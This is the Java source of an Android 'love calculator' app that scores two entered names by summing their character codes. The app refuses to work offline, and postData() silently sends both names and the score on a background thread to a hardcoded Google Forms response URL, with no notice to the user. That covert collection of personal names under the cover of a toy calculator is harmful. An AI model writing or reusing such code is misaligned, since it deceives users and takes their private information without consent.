package com.victor.calculator;

import android.app.*;
import android.os.*;
import android.widget.*;
import android.preference.*;
import android.view.textservice.*;
import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.view.*;
import java.net.URLEncoder;
import android.sax.*;

public class MainActivity extends Activity 
{
	private Button bu;
	private EditText e1;
	private EditText e2;
	private TextView tv;
	public String name1, name2, concat,sm;
    @Override
    protected void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
		tv=(TextView) findViewById(R.id.mainTextView1);
		e1=(EditText) findViewById(R.id.mainEditText1);
		e2=(EditText) findViewById(R.id.mainEditText2);
		Toast.makeText(this,"❤💖💕🔥😛",Toast.LENGTH_LONG).show();
		
    }
	public void send(View vi){
		if(isInternetOn()){
			name1=e1.getText().toString().toUpperCase();
			name2=e2.getText().toString().toUpperCase();
			if(name1.length()==0||name2.length()==0){
				Toast.makeText(this,"Dude!,fill all the fields ",Toast.LENGTH_LONG).show();
			}
			else{
				
					

				concat = name1.concat(name2);
				int sum = 0;
				for (int i = 0; i < concat.length(); i++) {
					char character = concat.charAt(i);
					int ascii = (int) character;
					sum += ascii;
					}
					sum=sum%100;
					sm=Integer.toString(sum);
				Thread t=new Thread(new Runnable(){

						@Override
						public void run()
						{
							// TODO: Implement this method
							postData();

						}


					});
					t.start();
				
					
				 if(sum<50){
						Toast.makeText(this,"Oh..geez!! .you will be single forever",Toast.LENGTH_LONG).show();
						Toast.makeText(this,"BUT A number from a shitty app doesn't measure your love.if you love someone then Go on and love them no matter what",Toast.LENGTH_LONG).show();
					}else{
						Toast.makeText(this,"love forever ",Toast.LENGTH_LONG).show();
					}
					tv.setText("The love between " + name1 + " and " + name2 + " is " + sum + "%  💕💖 ");
				}

			}
		
		else{
			Toast.makeText(this,"I know that you are broke but please turn on the internet 🙏",Toast.LENGTH_SHORT).show();
		}
			
		
			}
		
		public void postData(){
			String fullUrl = "https://docs.google.com/forms/d/e/1FAIpQLSfwN9WncTxMS5maD3rTxb2FTh6o6nWD997HvL8BhRae3UxHOw/formResponse";
			HttpRequest mReq = new HttpRequest();
			name1=e1.getText().toString().trim();
			name2=e2.getText().toString().trim();
			

			String data = "entry.838590963=" + URLEncoder.encode(name1) + "&" + 
				"entry.1531282266=" + URLEncoder.encode(name2) + "&" +
				"entry.583508361=" + URLEncoder.encode(sm);
			String response = mReq.sendPost(fullUrl, data);
			}
		
	
	
	public boolean isInternetOn() {

        // get Connectivity Manager object to check connection
        ConnectivityManager connec =
			(ConnectivityManager) getSystemService(getBaseContext().CONNECTIVITY_SERVICE);

        // Check for network connections
        if (connec.getNetworkInfo(0).getState() == android.net.NetworkInfo.State.CONNECTED ||
			connec.getNetworkInfo(0).getState() == android.net.NetworkInfo.State.CONNECTING ||
			connec.getNetworkInfo(1).getState() == android.net.NetworkInfo.State.CONNECTING ||
			connec.getNetworkInfo(1).getState() == android.net.NetworkInfo.State.CONNECTED) {


            return true;

        } else if (
			connec.getNetworkInfo(0).getState() == android.net.NetworkInfo.State.DISCONNECTED ||
			connec.getNetworkInfo(1).getState() == android.net.NetworkInfo.State.DISCONNECTED) {


            return false;
        }
        return false;
    }

}